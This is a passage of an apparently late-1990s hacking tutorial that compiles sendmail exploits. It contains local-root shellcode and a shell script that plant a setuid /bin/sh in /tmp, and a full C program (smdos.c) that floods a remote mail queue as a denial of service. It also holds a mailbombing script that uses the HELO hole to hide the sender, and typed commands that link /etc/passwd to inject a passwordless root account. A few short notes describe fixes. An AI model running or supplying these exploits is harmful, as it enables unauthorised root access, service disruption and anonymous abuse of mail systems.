+
+ {
+
+  int i,j;
+
+  FILE *f;
+
+  char nop_string[200];
+
+  char code_string[]=
+
+                      {
+
+                         "\xeb\x50"                         /* jmp
+
+cont */
+
+/* geteip: */            "\x5d"                             /* popl
+
+%ebp */
+
+                         "\x55"                             /* pushl
+
+%ebp */
+
+                         "\xff\x8d\xc3\xff\xff\xff"         /* decl
+
+0xffffffc3(%ebp) */
+
+                         "\xff\x8d\xd7\xff\xff\xff"         /* decl
+
+0xffffffd7(%ebp) */
+
+                         "\xc3"                             /* ret */
+
+/* 0xffffffb4(%ebp): */ "cp /bin/sh /tmp"
+
+/* 0xffffffc3(%ebp): */ "\x3c"
+
+                        "chmod a=rsx /tmp/sh"
+
+/* 0xffffffd7(%ebp): */ "\x01"
+
+                        "-leshka-leshka-leshka-leshka-"    /* reserved */
+
+/* cont:  */            "\xc7\xc4\x70\xcf\xbf\xef"         /* movl
+
+$0xefbfcf70,%esp */
+
+                        "\xe8\xa5\xff\xff\xff"             /* call
+
+geteip */
+
+                        "\x81\xc5\xb4\xff\xff\xff"         /* addl
+
+$0xb4ffffff,%ebp */
+
+                        "\x55"                             /* pushl  %ebp */
+
+                        "\x55"                             /* pushl  %ebp */
+
+                        "\x68\xd0\x77\x04\x08"             /* pushl
+
+$0x80477d0
+
+ */
+
+                        "\xc3"                             /* ret */
+
+                        "-leshka-leshka-leshka-leshka-"    /* reserved */
+
+                        "\xa0\xcf\xbf\xef"
+
+                     };
+
+  j=269-sizeof(code_string);
+
+  for(i=0;i\"$1\"\n");
+
+  fprintf(f,"touch -t 2510711313 \"$1\"\n");
+
+  fclose(f);
+
+}
+
+................................ Cut Here ................................
+
+mime7to8() = 8.8.0 =
+
+An attacker can simply create a very large message in which each line ends
+with "=" and use it to overwrite the sendmail process's stack. Here the bug
+is only described... why doesn't someone write an exploit?!
+
+There is a serious bug in the mime7to8() function of sendmail 8.8.0 which
+allows anyone who can send you mail to execute arbitrary code as root on
+your machine. I think mime7to8() only gets invoked if you set the
+undocumented "9" mailer flag. However, this flag is set by default in the
+cf/mailer/local.m4 file that ships with sendmail 8.8.0. Thus, if you are
+using an old V6 format configuration file from sendmail 8.7, you are
+probably safe, but if you generated a new V7 configuration file, you are
+probably vulnerable to this bug.
+
+Now here are the technical details:
+
+The inner loop of mime7to8() looks like this:
+
+        u_char *obp;
+
+        char buf[MAXLINE];
+
+        u_char obuf[MAXLINE];
+
+        ....
+
+                /* quoted-printable */
+
+                obp = obuf;
+
+                while (fgets(buf, sizeof buf, e->e_dfp) != NULL)
+
+                {
+
+                        if (mime_fromqp((u_char *) buf, &obp, 0, MAXLINE) == 0)
+
+                                continue;
+
+                        putline((char *) obuf, mci);
+
+                        obp = obuf;
+
+                }
+
+When mime_fromqp() encounters a line that ends "=\n", it chops those two
+characters off and returns 0 to indicate a continuation line. This causes
+the while loop to continue, reading another input line and appending its
+contents to obuf. However, when the loop continues without resetting obp to
+obuf, there are fewer than MAXLINE characters left in the output buffer.
+This means an attacker can simply create a very large message in which each
+line ends with "=". Eventually obp will move beyond the end of obuf and
+start writing almost arbitrary data to the sendmail process's stack (as
+long as no bytes are 0).
+
+smtpd = 8.7-8.8.2 =
+
+Read the exploit and don't bother:
+
+------------------------------ Cut Here --------------------------------
+
+#/bin/sh
+
+#
+
+#
+
+#                                   Hi !
+
+#                This is exploit for sendmail smtpd bug
+
+#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
+
+#         This shell script does a root shell in /tmp directory.
+
+#          If you have any problems with it, drop me a letter.
+
+#                                Have fun !
+
+#
+
+#
+
+#                           ----------------------
+
+#               ---------------------------------------------
+
+#    -----------------   Dedicated to my beautiful lady   ------------------
+
+#               ---------------------------------------------
+
+#                           ----------------------
+
+#
+
+#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su
+
+#
+
+#
+
+#
+
+echo   'main()                                                '>>leshka.c
+
+echo   '{                                                     '>>leshka.c
+
+echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
+
+echo   '}                                                     '>>leshka.c
+
+#
+
+#
+
+echo   'main()                                                '>>smtpd.c
+
+echo   '{                                                     '>>smtpd.c
+
+echo   '  setuid(0); setgid(0);                               '>>smtpd.c
+
+echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c
+
+echo   '}                                                     '>>smtpd.c
+
+#
+
+#
+
+cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
+
+./leshka
+
+kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]" "\n"
+
+|head -n 1`
+
+rm leshka.c leshka smtpd.c /tmp/smtpd
+
+/tmp/sh
+
+________________________________________________________________________
+
+
+A Local DoS(29) in All Sendmail Versions Up to 8.9.3 (taken from Packet Storm)
+****************************************************
+Date: Sat, 3 Apr 1999 00:42:56 +0200
+From: "[iso-8859-2] Micha3 Szyma¤ski" <siwa9@BOX43.GNET.PL>
+To: BUGTRAQ@netspace.org
+Subject: Re: Possible local DoS in sendmail
+
+Hi folks,
+
+This local queue filling DoS attack in sendmail is quite dangerous. But good
+security policy (like mine) will prevent attackers from doing such things.
+Control files (in /var/spool/mqueue) created by 'sendmail -t' are owned by
+root.attacker's_group; turn on quotas for group 'attacker's_group' on the
+file system containing /var/spool/mqueue directory, and your host will be not
+vulnerable; but you _have to_ configure your sendmail as _nosuid_ daemon;
+
+Much more dangerous are remote queue filling DoS attacks. If you have enabled
+relaying, you can use shown below smdos.c proggie; it will quite fast fullfill
+partition on disk where /var/spool/mqueue resides. you should notice increased
+LA during attack; in contrast to local DoS attacks, control files created by
+smdos.c are owned by root.root, so ... it's much more difficult to prevent
+offenders from doing it;
+
+don't forget to change BSIZE definition (in smdos.c) to appropriate victim's
+host message size limitation (MaxMessageSize option); you can also increase
+MAXCONN definition.
+
+smdos.c:
+
+--- CUT HERE ---
+/*
+By Michal Szymanski <siwa9@box43.gnet.pl>
+
+Sendmail DoS (up to 8.9.3);
+
+Sat Apr  3 00:12:31 CEST 1999
+*/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <errno.h>
+
+#undef VERBOSE          /* define it, if MORECONN is undefined */
+
+#define MORECONN
+
+// #define RCPT_TO      "foo@ftp.onet.pl"
+
+#define RCPT_TO "foo@10.255.255.255"
+
+#ifdef MORECONN
+#define MAXCONN 5
+#endif
+
+#define BSIZE   1048576         /* df* control file size */
+#define PORT    25
+
+char buffer[BSIZE];
+int sockfd,x,loop,chpid;
+
+void usage(char *fname) {
+fprintf(stderr,"Usage: %s <victim_host>\n",fname);
+exit(1);
+}
+
+void say(char *what) {
+
+if (write(sockfd,what,strlen(what))<0) {
+perror("write()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,"<%s",what);
+#endif
+
+bzero(buffer,BSIZE);
+
+usleep(1000);
+
+if (read(sockfd,buffer,BSIZE)<0) {
+perror("read()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,buffer);
+#endif
+}
+                        
+
+int main(int argc,char *argv[]) {
+struct sockaddr_in serv_addr;
+struct hostent *host;
+char *hostname,hostaddr[20];
+
+fprintf(stderr,"Sendmail DoS (up to 8.9.3) by siwa9 [siwa9@box43.gnet.pl]\n");
+
+if (argc<2) usage(argv[0]);
+
+#ifdef VERBOSE
+fprintf(stderr,">Preparing address. \n");
+#endif
+
+hostname=argv[1];
+
+serv_addr.sin_port=htons(PORT);
+serv_addr.sin_family=AF_INET;
+
+if ((serv_addr.sin_addr.s_addr=inet_addr(hostname))==-1) {
+
+#ifdef VERBOSE
+fprintf(stderr,">Getting info from DNS.\n");
+#endif
+
+if ((host=gethostbyname(hostname))==NULL) {
+herror("gethostbyname()");
+exit(h_errno);
+}
+
+serv_addr.sin_family=host->h_addrtype;
+
+bcopy(host->h_addr,(char *)&serv_addr.sin_addr,host->h_length);
+
+#ifdef VERBOSE
+fprintf(stderr,">Official name of host: %s\n",host->h_name);
+#endif
+
+hostname=host->h_name;
+
+sprintf(hostaddr,"%d.%d.%d.%d",(unsigned char)host->h_addr[0],
+                               (unsigned char)host->h_addr[1],
+                               (unsigned char)host->h_addr[2],
+                               (unsigned char)host->h_addr[3]);
+
+}
+else sprintf(hostaddr,"%s",hostname);
+
+#ifdef MORECONN
+for (;loop<MAXCONN;loop++) if (!(chpid=fork())) {
+#endif
+
+for(;;) {
+
+bzero(&(serv_addr.sin_zero),8);
+
+if ((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1) {
+perror("socket()");
+exit(errno);
+}
+
+if ((connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr))) == -1) {
+perror("connect()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,">Connected to [%s:%d].\n",hostname,PORT);
+#endif
+
+bzero(buffer,BSIZE);read(sockfd,buffer,BSIZE);
+#ifdef VERBOSE
+fprintf(stderr,buffer);
+#else
+fprintf(stderr,".");
+#endif
+
+say("helo foo\n");
+say("mail from:root@localhost\n");
+say("rcpt to:" RCPT_TO "\n");
+say("data\n");
+
+for (x=0;x<=BSIZE;x++) buffer[x]='X';write(sockfd,buffer,BSIZE);
+
+say("\n.\n");
+sleep(1);
+say("quit\n");
+
+shutdown(sockfd,2);
+
+close(sockfd);
+
+#ifdef VERBOSE
+fprintf(stderr,">Connection closed succesfully.\n");
+#endif
+}
+#ifdef MORECONN
+}
+waitpid(chpid,NULL,0);
+#endif
+return 0;
+}
+--- CUT HERE ---
+
+Bug in Sendmail's HELO Command (taken from rootshell.com)
+******************************
+Note: this won't get you root access(14) or get you into partsin a system you're 
+not supposed to get into, but this is still pretty cool. In fact, it let's you 
+hide your IP/hostname when faking mail!
+
+
+[ http://www.rootshell.com/ ]
+
+We've had this exploit since January but sat on it until everyone had a
+change of implementing a stable version of sendmail 8.9.x.  (And because the
+last thing I want to do is help the spammers)  It has now made its way to
+Bugtraq so without further ado.
+
+--Rootshell 5/28/98
+
+
+Date:         Fri, 22 May 1998 12:36:54 +0300
+From:         Valentin Pavlov <root@PNS.NETBG.COM>
+Subject:      about sendmail 8.8.8 HELO hole
+
+I assume this this is pretty old (10 Jan 1998) but still...
+
+I found a pretty simple way to prevent the hiding of the sender's IP
+address. The method to hide the IP address of the sender is described
+bellow. Now, if we want to keep track of such exploit attempts, we have to
+compile sendmail 8.8.8 with a PICKY_HELO_CHECK defined in conf.h:
+
+#define PICKY_HELO_CHECK 1
+
+This will force sendmail to syslog an authentication warning
+(message with LOG_INFO level) and include an X-Authentication-Warning:
+header in the message, saying what host tried to hide itself. Check out
+the source (srvrsmpt.c, main.c). Also, LogLevel must be set to a value
+higher than 3 (default is 9) in sendmail.cf.
+
+
+regards,
+capone
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Make source, not [high]score
+----------------------------
+Valentin 'Val Capone' Pavlov
+----------------------------
+capone@netbg.com,  UKTC87203
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Now for the original message, describing the exploit:
+
+-----Original Message-----
+From: Micha3 Zalewski <lcamtuf@boss.staszic.waw.pl>
+To: info@rootshell.com <info@rootshell.com>
+Date: 10 stycznia 1998 12:28
+Subject: Sendmail 8.8.8 (qmail?) HELO hole.
+
+
+Here's a brief description of Sendmail (qmail) hole I found
+recently:
+
+When someone mailbombs you, or tries to send fakemail, spam, etc -
+sendmail normally attachs sender's host name and it's address
+to outgoing message:
+
+--
+>From spam@flooders.net Mon Jan  5 22:08:21 1998
+Received: from spammer (marc@math.university.edu [150.129.84.5])
+          by myhost.com (8.8.8/8.8.8) with SMTP id WAA00376
+          for lcamtuf; Mon, 5 Jan 1998 22:07:54 +0100
+Date: Mon, 5 Jan 1998 22:07:54 +0100
+From: spam@flooders.net
+Message-Id: <3.14159665@pi>
+
+MAILBOOM!!!
+--
+
+That's perfect - now you know, who is responsible for that annoying
+junk in your mailbox: "Received: from spammer (marc@math.university.edu
+[150.129.84.5])". Nothing easier...
+But I found a small hole, which allows user to hide it's personality,
+and send mails anonymously. The only thing you should do is to
+pass HELO string longer than approx. 1024 B - sender's location and
+other very useful information will be cropped!!! Message
+headers should become not interesting. Sometimes, sender
+may become quite untraceable (but not always, if it's possible
+to obtain logs from machine which has been used to sent):
+
+--
+>From spam@flooders.net Mon Jan  5 22:09:05 1998
+Received: from xxxxxxxxxxxxxx... [a lot of 'x's] ...xxxx
+Date: Mon, 5 Jan 1998 22:08:52 +0100
+From: spam@flooders.net
+Message-Id: <3.14159665@pi>
+
+MAILBOOM!!! Now guess who am I...
+--
+
+
+Here's a simple example of Sendmail's HELO hole usage. Note, this
+script has been written ONLY to show how easy may be sending
+fakemails, mailbombs, with cooperation of Sendmail ;) Script is
+very slow and restricted in many ways, but explains the problem
+well (note, some of non-Berkeley daemons are also affected,
+probably Qmail?):
+
+-- EXPLOIT CODE --
+#!/bin/bash
+TMPDIR=/tmp/`whoami`
+PLIK=$TMPDIR/.safe
+TIMEOUT=2
+LIMIT=10
+MAX=20
+
+echo
+echo "SafeBomb 1.02b -- sendmail HELO hole usage example"
+echo "Author: Michal Zalewski <lcamtuf@boss.staszic.waw.pl>"
+echo
+
+if [ "$4" = "" ]; then
+  echo "USAGE: $0 msgfile address server sender"
+  echo
+  echo "  msgfile - file to send as a message body"
+  echo "  address - address of lucky recipient"
+  echo "  server  - outgoing smtp server w/sendmail"
+  echo "  sender  - introduce yourself"
+  echo
+  echo "WARNING: For educational use ONLY. Mailbombing is illegal."
+  echo "Think twice BEFORE you use this program in any way. Also,"
+  echo "I've never said this program is 100% safe nor bug-free."
+  echo
+  sleep 1
+  exit 0
+fi
+
+if [ ! -f $1 ]; then
+  echo "Message file not found."
+  echo
+  exit 0
+fi
+
+echo -n "Preparing message..."
+mkdir $TMPDIR &>/dev/null
+chmod 700 $TMPDIR
+echo "echo \"helo 
+_safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb_
+_safebomb__safebomb__safebomb__sa
+febomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__sa
+febomb__safebomb__safebomb__safebomb__safebomb__saf
+ebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__saf
+ebomb__safebomb__safebomb__safebomb__safebomb__safe
+bomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safe
+bomb__safebomb__safebomb__safebomb__safebomb__safeb
+omb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safeb
+omb__safebomb__safebomb__safebomb__safebomb__safebo
+mb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebo
+mb__safebomb__safebomb__safebomb__safebomb__safebom
+b__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebom
+b__safebomb__safebomb__safebomb__safebomb__safebomb
+b__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebom
+b__safebomb__safebomb__safebomb__safebomb__safebomb
+__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb
+__safebomb__safebomb__safebomb__safebomb__safebomb_
+_safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb_\"" >$PLIK
+echo "echo \"mail from: \\\"$4\\\"\"" >>$PLIK
+echo "echo \"rcpt to: $2\"" >>$PLIK
+echo "echo \"data\"" >>$PLIK
+echo "cat <<__qniec__" >>$PLIK
+cat $1 >>$PLIK
+echo "__qniec__" >>$PLIK
+echo "echo \".\"" >>$PLIK
+echo "echo \"quit\"" >>$PLIK
+echo "sleep $TIMEOUT" >>$PLIK
+chmod +x $PLIK
+echo "OK"
+
+echo "Sending $1 (as $4) to $2 via $3 -- Ctrl+Z to abort."
+SENT=0
+
+while [ -f $1 ]; do
+  $PLIK|telnet $3 25 &>/dev/null &
+  let SENT=SENT+1
+  echo -ne "Sent: $SENT\b\b\b\b\b\b\b\b\b\b\b\b\b"
+  CONNECTED=`ps|grep -c "telnet $3"`
+  if [ "$LIMIT" -le "$CONNECTED" ]; then
+    while [ "$LIMIT" -le "$CONNECTED" ]; do
+      sleep 1
+    done
+  fi
+  if [ "$SENT" -ge "$MAX" ]; then
+    echo "It's just an example, sorry."
+    echo
+    exit 0
+  fi
+done
+-- EOF --
+
+Suggested fix: insert additional length limit into HELO/EHLO
+parameter scanning routine OR disable AllowBogusHELO (but it
+may cause serious troubles). I have no 8.8.8 sources at the
+time, so execuse me if it's unclear.
+
+PS:
+
+--
+From: Gregory Neil Shapiro <sendmail+gshapiro@sendmail.org>
+
+I was able to reproduce the header problem by lengthening the HELO string
+in your script.
+
+[...]
+
+This will be fixed in sendmail 8.9.
+--
+
+_______________________________________________________________________
+Micha3 Zalewski [tel 9690] | finger 4 PGP [lcamtuf@boss.staszic.waw.pl]
+Iterowa‘ jest rzeczñ ludzkñ, wykonywa‘ rekursywnie - boskñ [P. Deustch]
+=--------- [ echo "while [ -f \$0 ]; do \$0 &;done" >_;. _ ] ---------=
+
+Giant Bug in Sendmail 8.8.4 (taken from hackersclub.com)
+***************************
+
+                         sendmail8.8.4 exploit 
+                           
+"sendmail? 'tis the bugiest program" -phriend-
+
+Ok, here's a brief and interesting explonation of this famous exploit. This
+exploit uses sendmail version 8.8.4 and it requires that you have a shell
+acount on the server in question. The exploit creates a link from
+/etc/passwd to /var/tmp/dead.letter Very simple really. Here's how it
+works, below are the exact commands as you have to type them (for the
+technically challendged ones)
+
+   * ln /etc/passwd /var/tmp/dead.letter
+   * telnet target.host 25
+   * mail from: nonexsistent@not.an.actual.host.com
+   * rcpt to: nonexsistent@not.as.actual.host.com
+   * data
+   * lord::0:0:leet shit:/root:/bin/bash
+   * .
+   * quit
+
+Kaboom, you're done, telnet to port 23 and log in as lord, no password
+required. Thanx to a little bit of work we did, lord just happens to have
+the same priviledges as root.
+
+There are a couple of reasons why this might not work.
+
+  1. /var and / are different partitions (as you already know, you can't
+     make hard links between different partitions)
+  2. There is a postmaster account on a machine or mail alias, in which
+     case, your mail will end up there instead of being written to a
+     etc/passwd
+  3. /var/tmp doesn't exist or isn't publicly writable
+
+Duncan Silver 
+www.hackersclub.com/uu
+
+Editor's notes: lord::0:0:leet shit:/root:/bin/bash is a line out of a Unix 
+password file(33).
+
+Courtesy: blacksun.box.sk
+---------------------------------------------------------------------------
+Compiled By: Ankit Fadia
+             ankit@bol.net.in
+
+To receive more tutorials on Hacking, Perl, C++ and Viruses/Trojans join my 
+mailing list:
+
+Send an email to programmingforhackers-subscribe@egroups.com to join it.
+
+Visit my Site to view the archive of tutorials written by me at: 
+http://www.crosswinds.net/~hackingtruths
